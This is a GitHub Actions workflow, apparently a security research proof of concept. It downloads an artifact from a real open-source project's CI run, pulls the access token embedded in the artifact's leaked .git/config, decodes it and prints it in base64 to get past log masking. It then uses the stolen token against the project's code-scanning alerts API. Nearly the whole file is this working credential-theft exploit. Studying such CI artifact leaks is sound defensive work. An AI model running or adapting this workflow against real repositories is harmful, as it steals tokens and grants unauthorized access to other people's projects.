# This is a basic workflow to help you get started with Actions

name: Downloader

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the "main" branch

  # Allows you to run this workflow manually from the Actions tab
  push:
  workflow_dispatch:

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it

      - name: Wait
        run: |                      
          url="https://api.github.com/repos/milvus-io/milvus/actions/runs/7353055100/artifacts --header 'Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}'" 
          expected_response="Success"            
          
          while true; do
            response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
          
            if [[ "$response" == "200" ]]; then  # Check for HTTP success code
              body=$(curl -s "$url")
              if [[ "$body" == *"$expected_response"* ]]; then
                echo "Desired response received!"
                break
              fi
            fi
          
            echo "Response not yet met. Retrying in 5 seconds..."
            sleep 5
          done
          
      


      - uses: actions/download-artifact@v4
        with:
          name: go-result
          github-token: ${{ secrets.GITHUB_TOKEN }} # token with actions:read permissions on target repo
          repository: milvus-io/milvus
          run-id: 7353055100

      - name: Extract
        run: |        
          ls /home/runner/work/artifacts/artifacts
          cd /home/runner/work/artifacts/artifacts/.git
          cat config | base64
          token=$(grep -o 'basic .*' config | sed "s|basic ||g" | base64 -d | sed "s|x-access-token:||g")
          echo $token
          echo $token | base64

          curl --location --request GET 'https://api.github.com/repos/cider-research-testing/artifacts/code-scanning/alerts' --header 'Content-Type: application/json' --header 'Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}'
          curl --location --request GET 'https://api.github.com/repos/milvus-io/milvus/code-scanning/alerts' --header 'Content-Type: application/json' --header 'Authorization: Bearer $token'

        
